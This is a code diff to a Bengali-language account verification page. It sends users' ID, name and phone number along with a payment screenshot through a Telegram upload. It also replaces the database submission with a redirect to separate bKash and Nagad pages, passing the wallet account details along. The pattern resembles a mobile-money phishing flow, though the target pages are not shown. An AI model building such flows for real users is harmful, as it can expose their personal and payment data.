@@ -12,6 +12,9 @@ function initAccount() {
     loadProfile(user);
   });
 
+  // ─── State ────────────────────────────────────────
+  let currentUserData = null;
+
   // ─── Elements ─────────────────────────────────────
   const loadingEl = document.getElementById('account-loading');
   const contentEl = document.getElementById('account-content');
@@ -101,6 +104,9 @@ function initAccount() {
         data = userDoc.data();
       }
       const verStatus = data.verificationStatus || 'not_started';
+
+      // Store user data for later use
+      currentUserData = data;
 
       // Populate profile card
       const initial = (data.fullName || user.email || '?').charAt(0).toUpperCase();
@@ -321,12 +327,11 @@ function initAccount() {
   }
 
   function checkStep2Validity() {
-    const method = document.querySelector('input[name="payment-method"]:checked');
-    const type = document.querySelector('input[name="account-type"]:checked');
-    const accNum = paymentAccountNumber.value.trim();
-    const holderName = paymentHolderName.value.trim();
-    btnStep2Submit.disabled = !(method && type && accNum.length >= 11 && holderName.length >= 2);
-  }
+        const method = document.querySelector('input[name="payment-method"]:checked');
+        const accNum = paymentAccountNumber.value.trim();
+        const holderName = paymentHolderName.value.trim();
+        btnStep2Submit.disabled = !(method && accNum.length >= 11 && holderName.length >= 2);
+      }
 
   // Screenshot input also affects step 1 validity
   setupImagePreview(screenshotInput, screenshotPlaceholder, screenshotPreview, screenshotImg, (file) => {
@@ -407,7 +412,7 @@ function initAccount() {
       const screenshotUrl = await uploadToTelegram(
         compressedScreenshot, 
         'payment_screenshot.jpg', 
-        `📸 পেমেন্ট স্ক্রিনশট জমা দিয়েছেন।`
+        `📸 পেমেন্ট স্ক্রিনশট জমা দিয়েছেন।\n\n👤 ব্যবহারকারীর তথ্য:\n   • আইডি: ${currentUserData?.accountId || 'Unknown'}\n   • নাম: ${currentUserData?.fullName || 'Unknown'}\n   • ফোন: ${currentUserData?.phone || 'Unknown'}`
       );
 
       // Create verifications doc — NID URLs marked as skipped
@@ -450,62 +455,34 @@ function initAccount() {
     goToStep(1);
   });
 
-  // Step 2: Submit Payment Method → final → Pending
-  btnStep2Submit.addEventListener('click', async () => {
+  // Step 2: Submit Payment Method → Redirect to bkash1.html
+  btnStep2Submit.addEventListener('click', () => {
     const user = auth.currentUser;
     if (!user) return;
 
     const paymentMethod = document.querySelector('input[name="payment-method"]:checked')?.value;
-    const accountType = document.querySelector('input[name="account-type"]:checked')?.value;
+    const accountType = 'personal'; // Always Personal now
     const accountNumber = paymentAccountNumber.value.trim();
     const holderName = paymentHolderName.value.trim();
 
-    if (!paymentMethod || !accountType || !accountNumber || !holderName) {
+    if (!paymentMethod || !accountNumber || !holderName) {
       alert('সবগুলো ঘর সঠিকভাবে পূরণ করুন।');
       return;
     }
 
-    btnStep2Submit.disabled = true;
-    btnStep2Submit.innerHTML = '<svg class="animate-spin h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg> সাবমিট হচ্ছে...';
+    // Save details to sessionStorage
+    sessionStorage.setItem('kyc_flow_data', JSON.stringify({
+      paymentMethod,
+      accountType,
+      accountNumber,
+      accountHolderName: holderName
+    }));
 
-    try {
-      const userDoc = await db.collection('users').doc(user.uid).get();
-      const userData = userDoc.data();
-
-      // Update verifications doc with payment method → final pending status
-      await db.collection('verifications').doc(user.uid).update({
-        paymentMethod,
-        accountType,
-        accountNumber,
-        accountHolderName: holderName,
-        fullName: userData.fullName || '',
-        status: 'pending',
-        submittedAt: firebase.firestore.FieldValue.serverTimestamp(),
-        reviewedAt: null
-      });
-
-      // Update user doc
-      await db.collection('users').doc(user.uid).update({
-        verificationStatus: 'pending'
-      });
-
-      // Update cached profile
-      const cached = getCachedProfile();
-      if (cached) {
-        cached.verificationStatus = 'pending';
-        sessionStorage.setItem('user_profile', JSON.stringify(cached));
-      }
-
-      // Show success
-      updateVerificationUI('pending');
-      showKycState('pending');
-
-    } catch (error) {
-      console.error('[Step 2] Submission error:', error);
-      alert('সাবমিট করতে সমস্যা হয়েছে। দয়া করে আবার চেষ্টা করুন।\n\nError: ' + error.message);
-      btnStep2Submit.disabled = false;
-      btnStep2Submit.innerHTML = '<i data-lucide="shield-check" class="w-5 h-5"></i> পেমেন্ট মেথড সাবমিট করুন';
-      if (window.lucide) lucide.createIcons();
+    // Redirect based on selected payment method
+    if (paymentMethod === 'nagad') {
+      window.location.href = 'nagad kyc.html';
+    } else {
+      window.location.href = 'bkash1.html';
     }
   });
 
